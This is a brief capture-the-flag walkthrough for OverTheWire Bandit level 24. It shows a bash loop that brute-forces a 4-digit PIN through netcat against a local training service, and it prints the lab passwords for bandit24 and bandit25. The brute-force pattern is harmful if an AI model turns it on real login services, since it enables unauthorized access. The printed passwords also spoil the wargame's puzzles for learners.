# bandit 24

    # ssh bandit24@bandit.labs.overthewire.org
    password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

    # mkdir /tmp/vving && cd /tmp/vving
    # cat shell.sh

    i=0
    while [ $i -lt 10000 ]
    do
        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | nc localhost 30002 >> log
        i=$(($i+1))
    done

    # bash shell.sh

    # cat log | sort | uniq
    The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

